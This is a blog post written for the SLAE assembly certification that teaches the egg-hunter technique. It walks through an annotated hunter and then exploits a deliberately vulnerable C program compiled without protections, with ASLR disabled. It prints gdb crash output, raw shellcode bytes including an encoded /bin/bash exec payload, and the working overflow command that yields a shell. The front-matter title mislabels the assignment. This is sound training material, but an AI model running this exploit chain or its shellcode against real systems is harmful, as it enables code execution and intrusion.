---
layout: post
title: Assignment #2: Reverse Shell TCP
categories: [re,exploit]
tags: [slae, osce]
fullview: false
comments: true
---

# Assignment #3: Egg Hunter
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228

My intention here is to show the egg hunting technique and demonstrate in a simple buffer overflow.

## Egg hunter

The egg hunter is a **robust**, **small** and **fast** piece of code that will search a process' Virtual Address Space (VAS) for another piece of code to jump to. This is a useful technique when our buffer is too small for our shellcode. In this case we might put our shellcode somewhere else in the memory (in the heap, for instance) and put the small egg hunter in the buffer. After redirecting the program flow, it will jump to the egg hunter, which will scan the memory for the rest of the shellcode.

In fact, this is called a **staged payload**, a payload that is delivered in multiple parts distributed along the program's memory space.

This technique is described in Skape's *awesome* paper entitled [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). I strongly recommend reading it.

## But where would my shellcode be?

This is a valid question and I asked it myself multiple times when I was studying egg hunters. What happens is in many programs the user input (i.e. our payload) might be copied into multiple locations, like the heap or even some other parts of the stack. This makes it possible for the egg hunter to find the second stage of our payload in a place where it fits perfectly. In its paper Skape describres two vulnerabilites that helps understanding this concept.

For now, let me show you [this exploit](https://tekwizz123.blogspot.com/2014/10/finding-new-vulns-with-fuzzing-and.html). Although it was made for Windows, it helps understanding how the exploit attack vector might allow the payload to be distributed in multiple stages along the memory. The whole point of the exploit is that sending a large string of 'A's as the path of a HTTP request crashes the application and leads to a BoF. However, the attacker can also insert payloads (stages)
into the other fields.

```

    POST /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    <<<< STAGE 1
    HTTP/1.1\r\n
    User-Agent: Wget/1.13.4\r\n
    Host: 192.168.99.142:8080\r\n
    Accept: */*\r\n
    Connection: Keep-Alive\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 50

    licenseID=string&content=string&paramsXML=string&SHELLCODE_HERE      <<<< STAGE 2
```

When the application parses this request, the first stage (egg hunter) is allocated in a certain part of the memory, while the second one (shellcode) goes to a different place. Now even if the buffer was too small to accomodate our shellcode if we sent it instead of the bunch of 'A's, passing it as a second stage will solve the problem. Finally, we use the egg hunter to find where exactly the shellcode is.

## How it works
The problem with searching a process' VAS is that it is not allowed to touch every single address. Trying to access a forbidden block of memory would generate a SIGSEGV signal, which might crash the process. One solution might be to create a SIGSEGV handler so we could manage every time this problem happened. That said and according to Skape, this idea would result in a way too large payload.

Therefore, a better approach is to abuse the system call interface to validate a memory address without receiving a segmentation fault. Instead of returning SIGSEGV, a syscall generally returns an EFAULT, which will not crash our program. The chosen syscall was *access()*, which is meant to check if the current process has the specific access rights to a given file on disk. The reason for this choice is related to the amount of pointer arguments it receives and the fact that it
does not try to write to the pointer supplied.

    int access(const char *pathname, int mode);

Another problem an attacker would find while developing an egg hunter is how the hunter will know when it found the shellcode or not. A solution would be to prepend the shellcode with some identifying bytes, like 'w00t'. This little guy is called the EGG, by the way. There is still a tricky part though. What if the egg hunter finds itself!? An elegant way to solve this problem is to prepend the shellcode with the same identifier again. So right before the shellcode we will have
'w00tw00t', so the hunter knows it has found the right piece of code.

Here it is the 39 bytes payload as showed in the paper, along with my comments. The egg here is '\x90\x50\x90\x50'. For the record, *ebx* is mostly responsible for storing the egg, while *ecx* points to the page and *edx* points to the address being checked.

```
00000000  BB90509050        mov ebx,0x50905090 ;ebx points to the egg
00000005  31C9              xor ecx,ecx ;clear ecx
00000007  F7E1              mul ecx ;clear eax and edx
00000009  6681CAFF0F        or dx,0xfff ;if an address in the page is invalid, all other addresses in the page are invalid. Jmp here to align the page.
0000000E  42                inc edx ; If the address was invalid, this line finishes the alignment. Otherwise it will simply increment edx to check the next address.
0000000F  60                pusha ;saves all the registers in the stack
00000010  8D5A04            lea ebx,[edx+0x4] ;ebx must contain the pointer to the address to be validated, which is pointed by edx. The +4 is an optimization
00000013  B021              mov al,0x21 ;set access() syscall number
00000015  CD80              int 0x80 ;force interrupt
00000017  3CF2              cmp al,0xf2 ;check if address is valid (0xf2==EFAULT)
00000019  61                popa ;restore saved registers
0000001A  74ED              jz 0x9 ;if address is not valid, go to 00000009
0000001C  391A              cmp [edx],ebx ;if the adress is valid, check if it contains the egg
0000001E  75EE              jnz 0xe ;if the address is valid but does not contain the egg, go to 0000000E
00000020  395A04            cmp [edx+0x4],ebx ;if the address is valid and contains the egg, check if the next byte contains the other egg
00000023  75E9              jnz 0xe ;if it does not contain the second egg, then the hunter found itself! Go to 0000000E
00000025  FFE2              jmp edx ;We found both eggs! Go to shellcode o/
```

## Exploit
Now that we already have a working egg hunter, lets use it in a simple buffer overflow exploit. Although it will be a simple vanilla BoF, we will force the use of the egg hunter. Instead of overwriting EIP then jumping into the shellcode, we will jump to the egg hunter, so it can look for the shellcode.

```
// vuln.c
#include <stdio.h>
#include<string.h>

void echo(char *in)
{
    char buffer[1024];

    printf("Enter some text:\n");
    strcpy(buffer, in);
    printf("You entered: %s\n", buffer);    
}

int main(int argc, char *argv[])
{
    echo(argv[1]);

    return 0;
}
```

Compiling it without protections:

	gcc -g -fno-stack-protector -z execstack -o vuln vuln.c -m32	

Disabling ASLR:

    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Detecting the overflow:

```
$ gdb -q ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
gdb-peda$ pattern_arg 2000
Set 1 arguments to program
gdb-peda$ run
Starting program: /opt/SLAE/assignment3/vuln 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'
Enter some text:
You entered: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x7de 
EBX: 0x6e41286e ('n(An')
ECX: 0x7ffff822 
EDX: 0xf7fa8870 --> 0x0 
ESI: 0x2 
EDI: 0xf7fa7000 --> 0x1b2db0 
EBP: 0x3b6e4144 ('DAn;')
ESP: 0xffffc870 ("nEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)"...)
EIP: 0x41296e41 ('An)A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41296e41
[------------------------------------stack-------------------------------------]
0000| 0xffffc870 ("nEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)"...)
0004| 0xffffc874 ("aAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEA"...)
0008| 0xffffc878 ("AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC"...)
0012| 0xffffc87c ("nbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACF"...)
0016| 0xffffc880 ("1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbA"...)
0020| 0xffffc884 ("AncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1AC"...)
0024| 0xffffc888 ("n2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACc"...)
0028| 0xffffc88c ("HAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2A"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41296e41 in ?? ()
gdb-peda$ pattern_search 
Registers contain pattern buffer:
EIP+0 found at offset: 1036
EBP+0 found at offset: 1032
EBX+0 found at offset: 1028
Registers point to pattern buffer:
[ESP] --> offset 1040 - size ~203
Pattern buffer found at:
0x56558008 : offset 1011 - size  989 ([heap])
0x565583e6 : offset  977 - size   34 ([heap])
0xffffc460 : offset    0 - size 2000 ($sp + -0x410 [-260 dwords])
0xffffcc31 : offset  293 - size 1707 ($sp + 0x3c1 [240 dwords])
References to pattern buffer found at:
0xf7fa7d64 : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d68 : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d6c : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d70 : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d74 : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d78 : 0x56558008 (/lib32/libc-2.24.so)
0xf7fa7d7c : 0x56558008 (/lib32/libc-2.24.so)
0xffffbe48 : 0x56558008 ($sp + -0xa28 [-650 dwords])
0xffffbe50 : 0x56558008 ($sp + -0xa20 [-648 dwords])
0xffffbe64 : 0x56558008 ($sp + -0xa0c [-643 dwords])
0xffffbe84 : 0x56558008 ($sp + -0x9ec [-635 dwords])
0xffffbe94 : 0x56558008 ($sp + -0x9dc [-631 dwords])
0xffffbea0 : 0x56558008 ($sp + -0x9d0 [-628 dwords])
0xffffbec8 : 0x56558008 ($sp + -0x9a8 [-618 dwords])
0xffffbee4 : 0x56558008 ($sp + -0x98c [-611 dwords])
0xffffc348 : 0x56558008 ($sp + -0x528 [-330 dwords])
0xffffc350 : 0x56558008 ($sp + -0x520 [-328 dwords])
0xffffc384 : 0x56558008 ($sp + -0x4ec [-315 dwords])
0xffffc394 : 0x56558008 ($sp + -0x4dc [-311 dwords])
0xffffc3a0 : 0x56558008 ($sp + -0x4d0 [-308 dwords])
0xffffc454 : 0xffffc460 ($sp + -0x41c [-263 dwords])
```

We used here *pattern_arg* and *pattern_search* to find the necessary bytes until overwriting EIP.
Great, so EIP is overwritten with 1036 bytes. Our payload should be constructed like:

	PAYLOAD = NOPS\*800 + EGGHUNTER(38bytes) + NOPS\*198 + EIP(jmp to egghunter) + NOPS\*20 + EGG + EGG + SHELLCODE

The bunch of NOPs will make our payload more reliable and easier to create. Also, the NOPs right before the eggs are important to give space for the shellcode to unpack.

To generate our payload, we use:

    $msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/bash" -e x86/alpha_upper --smallest -f c

For the egg hunter, I chose to use [this one](http://shell-storm.org/shellcode/files/shellcode-839.php) (for no special reason):

    \xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7

We must now find the address of our egg hunter:

```
gdb-peda$ r $(python -c 'print "\x90"*800 + "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7" + "\x90"*198 + "BBBB" + "\x90"*20 + "\x90\x50\x90\x50\x90\x50\x90\x50\x89\xe3\xda\xcd\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x32\x4a\x44\x4b\x51\x48\x4c\x59\x56\x32\x53\x56\x32\x48\x56\x4d\x53\x53\x4d\x59\x4a\x47\x42\x48\x56\x4f\x43\x43\x43\x58\x45\x50\x55\x38\x36\x4f\x42\x42\x52\x49\x32\x4e\x4d\x59\x4d\x33\x50\x52\x4b\x58\x34\x4a\x45\x50\x43\x30\x55\x50\x46\x4f\x35\x32\x42\x49\x32\x4e\x36\x4f\x32\x42\x43\x51\x44\x33\x45\x38\x55\x50\x30\x57\x46\x33\x4d\x59\x4d\x31\x58\x4d\x4b\x30\x41\x41"')
Starting program: /opt/SLAE/assignment3/vuln $(python -c 'print "\x90"*800 + "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7" + "\x90"*198 + "BBBB" + "\x90"*20 + "\x90\x50\x90\x50\x90\x50\x90\x50\x89\xe3\xda\xcd\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x32\x4a\x44\x4b\x51\x48\x4c\x59\x56\x32\x53\x56\x32\x48\x56\x4d\x53\x53\x4d\x59\x4a\x47\x42\x48\x56\x4f\x43\x43\x43\x58\x45\x50\x55\x38\x36\x4f\x42\x42\x52\x49\x32\x4e\x4d\x59\x4d\x33\x50\x52\x4b\x58\x34\x4a\x45\x50\x43\x30\x55\x50\x46\x4f\x35\x32\x42\x49\x32\x4e\x36\x4f\x32\x42\x43\x51\x44\x33\x45\x38\x55\x50\x30\x57\x46\x33\x4d\x59\x4d\x31\x58\x4d\x4b\x30\x41\x41"')
Enter some text:
You entered: ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1���f���Bj!X�Z̀<�tP�P�ׯu��u��琐����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������BBBB���������������������P�P�P�P�����s�ZJJJJJCCCCCCRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI2JDKQHLYV2SV2HVMSSMYJGBHVOCCCXEPU86OBBRI2NMYM3PRKX4JEPC0UPFO52BI2N6O2BCQD3E8UP0WF3MYM1XMK0AA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x4d8 
EBX: 0x90909090 
ECX: 0x7ffffb28 
EDX: 0xf7fa8870 --> 0x0 
ESI: 0x2 
EDI: 0xf7fa7000 --> 0x1b2db0 
EBP: 0x90909090 
ESP: 0xffffcb70 --> 0x90909090 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcb70 --> 0x90909090 
0004| 0xffffcb74 --> 0x90909090 
0008| 0xffffcb78 --> 0x90909090 
0012| 0xffffcb7c --> 0x90909090 
0016| 0xffffcb80 --> 0x90909090 
0020| 0xffffcb84 --> 0x50905090 
0024| 0xffffcb88 --> 0x50905090 
0028| 0xffffcb8c --> 0xcddae389 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()

gdb-peda$ x/40wx $esp-300
0xffffca44:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffca54:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffca64:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffca74:	0x90909090	0x90909090	0x90909090	0xf7c931fc
0xffffca84:	0xca8166e1	0x6a420fff	0x5a8d5821	0x3c80cd04
0xffffca94:	0xb8ee74f2	0x50905090	0x75afd789	0xe675afe9
0xffffcaa4:	0x9090e7ff	0x90909090	0x90909090	0x90909090
0xffffcab4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcac4:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcad4:	0x90909090	0x90909090	0x90909090	0x90909090
```

Once we overwrite EIP, we will jump to 0xffffca44. It could be any other address among the NOPs. Notice that after running down the NOP sled, EIP will be pointing to our egg hunter, not to the shellcode!


```
valle@slae:/SLAE/assignment3$ ./vuln $(python -c 'print "\x90"*800 + "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7" + "\x90"*198 + "\x44\xca\xff\xff" + "\x90"*20 +"\x90\x50\x90\x50\x90\x50\x90\x50\x89\xe3\xda\xcd\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x32\x4a\x44\x4b\x51\x48\x4c\x59\x56\x32\x53\x56\x32\x48\x56\x4d\x53\x53\x4d\x59\x4a\x47\x42\x48\x56\x4f\x43\x43\x43\x58\x45\x50\x55\x38\x36\x4f\x42\x42\x52\x49\x32\x4e\x4d\x59\x4d\x33\x50\x52\x4b\x58\x34\x4a\x45\x50\x43\x30\x55\x50\x46\x4f\x35\x32\x42\x49\x32\x4e\x36\x4f\x32\x42\x43\x51\x44\x33\x45\x38\x55\x50\x30\x57\x46\x33\x4d\x59\x4d\x31\x58\x4d\x4b\x30\x41\x41"')
Enter some text:
You entered:
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1���f���Bj!X�Z̀<�tP�P�ׯu��u��琐����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������D������������������������P�P�P�P�����s�ZJJJJJCCCCCCRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI2JDKQHLYV2SV2HVMSSMYJGBHVOCCCXEPU86OBBRI2NMYM3PRKX4JEPC0UPFO52BI2N6O2BCQD3E8UP0WF3MYM1XMK0AA
valle@slae:/SLAE/assignment3$ whoami
valle
```

Done!
